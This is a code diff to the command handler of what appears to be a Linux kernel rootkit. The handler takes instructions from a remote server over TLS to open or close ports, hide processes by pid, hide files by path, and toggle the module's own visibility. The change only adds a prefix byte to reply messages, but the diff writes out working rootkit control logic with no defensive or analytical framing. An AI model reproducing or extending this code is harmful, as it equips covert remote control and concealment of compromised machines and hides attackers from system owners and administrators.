@@ -326,40 +326,47 @@ void read_TLS(struct work_struct* work) {
     len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
     printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
     if (len < 5) {
-        strcpy(buffer, bad_len);
-        send_msg(svc->tls_socket, buffer, strlen(bad_len));
+        buffer[0] = 'm';
+        strcpy(buffer + 1, bad_len);
+        send_msg(svc->tls_socket, buffer, strlen(bad_len) + 1);
         goto resched;
     }
     if (memcmp("open ", buffer, 5) == 0) {
         //Open a port
         if (kstrtou16(buffer + 5, 10, &tmp_port)) {
-            strcpy(buffer, bad_port);
-            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            buffer[0] = 'm';
+            strcpy(buffer + 1, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port) + 1);
             goto resched;
         }
         open_ports[open_port_count++] = tmp_port;
-        strcpy(buffer, open);
-        send_msg(svc->tls_socket, buffer, strlen(open));
+        buffer[0] = 'm';
+        strcpy(buffer + 1, open);
+        send_msg(svc->tls_socket, buffer, strlen(open) + 1);
     } else if (memcmp("close ", buffer, 6) == 0) {
         //Close a port
         if (kstrtou16(buffer + 6, 10, &tmp_port)) {
-            strcpy(buffer, bad_port);
-            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            buffer[0] = 'm';
+            strcpy(buffer + 1, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port) + 1);
             goto resched;
         }
         if (tmp_port == PORT) {
-            strcpy(buffer, bad_drop);
-            send_msg(svc->tls_socket, buffer, strlen(bad_drop));
+            buffer[0] = 'm';
+            strcpy(buffer + 1, bad_drop);
+            send_msg(svc->tls_socket, buffer, strlen(bad_drop) + 1);
             goto resched;
         }
         closed_ports[closed_port_count++] = tmp_port;
-        strcpy(buffer, close);
-        send_msg(svc->tls_socket, buffer, strlen(close));
+        buffer[0] = 'm';
+        strcpy(buffer + 1, close);
+        send_msg(svc->tls_socket, buffer, strlen(close) + 1);
     } else if (memcmp("clear", buffer, 5) == 0) {
         open_port_count = 0;
         closed_port_count = 0;
-        strcpy(buffer, clear);
-        send_msg(svc->tls_socket, buffer, strlen(clear));
+        buffer[0] = 'm';
+        strcpy(buffer + 1, clear);
+        send_msg(svc->tls_socket, buffer, strlen(clear) + 1);
     } else if (memcmp("test", buffer, 4) == 0) {
         if (hidden) {
             show();
@@ -371,38 +378,42 @@ void read_TLS(struct work_struct* work) {
         show();
         strcpy(buffer, "foobar");
         send_msg(svc->tls_socket, buffer, strlen("foobar"));
-    //Processes that need to be killed when they aren't hidden
+        //Processes that need to be killed when they aren't hidden
     } else if (memcmp("hidek", buffer, 5) == 0) {
         if (kstrtou16(buffer + 6, 10, &tmp_port)) {
-            strcpy(buffer, bad_port);
-            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            buffer[0] = 'm';
+            strcpy(buffer + 1, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port) + 1);
             goto resched;
         }
         //Store the pid in the hidden proc list
         hidden_kill_procs[hidden_kill_count++] = tmp_port;
-    //Hiding a file given an absolute path
+        //Hiding a file given an absolute path
     } else if (memcmp("hidef", buffer, 5) == 0) {
         //Zero out newline char
         buffer[len - 1] = '\0';
         if (hide_file(buffer + 6, hidden_files + hidden_file_count)) {
             ++hidden_file_count;
         } else {
-            strcpy(buffer, bad_file);
-            send_msg(svc->tls_socket, buffer, strlen(bad_file));
+            buffer[0] = 'm';
+            strcpy(buffer + 1, bad_file);
+            send_msg(svc->tls_socket, buffer, strlen(bad_file) + 1);
             goto resched;
         }
-    //Processes that can't be killed when they aren't hidden
+        //Processes that can't be killed when they aren't hidden
     } else if (memcmp("hide", buffer, 4) == 0) {
         if (kstrtou16(buffer + 5, 10, &tmp_port)) {
-            strcpy(buffer, bad_port);
-            send_msg(svc->tls_socket, buffer, strlen(bad_port));
+            buffer[0] = 'm';
+            strcpy(buffer + 1, bad_port);
+            send_msg(svc->tls_socket, buffer, strlen(bad_port) + 1);
             goto resched;
         }
         //Store the pid in the hidden proc list
         hidden_procs[hidden_count++] = tmp_port;
     } else {
-        strcpy(buffer, unknown);
-        send_msg(svc->tls_socket, buffer, strlen(unknown));
+        buffer[0] = 'm';
+        strcpy(buffer + 1, unknown);
+        send_msg(svc->tls_socket, buffer, strlen(unknown) + 1);
     }
 resched:
     schedule_work(&w);
